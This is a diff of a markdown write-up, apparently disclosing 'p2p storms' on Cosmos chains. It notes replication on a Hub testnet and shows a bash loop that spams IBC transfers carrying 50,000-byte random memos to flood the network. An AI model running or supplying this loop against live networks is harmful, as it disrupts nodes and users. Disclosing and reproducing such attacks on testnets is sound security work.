@@ -101,6 +101,9 @@ We're looking to transmit a "banana client".  This transaction will
 * Stride
 
 
+And p2p storms have been safely replicated on the cosmos hub replicated security testnet. 
+
+
 ## Notes
 
 Change the maximum request body size in config.toml
@@ -172,15 +175,4 @@ for i in $( eval echo {"$SEQUENCE"..10000000} )
          do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
          done
 ```
-
-
-
-
-
-
- Hub testnet blcok range 3881725 to 3881733
-
-
-
-
 
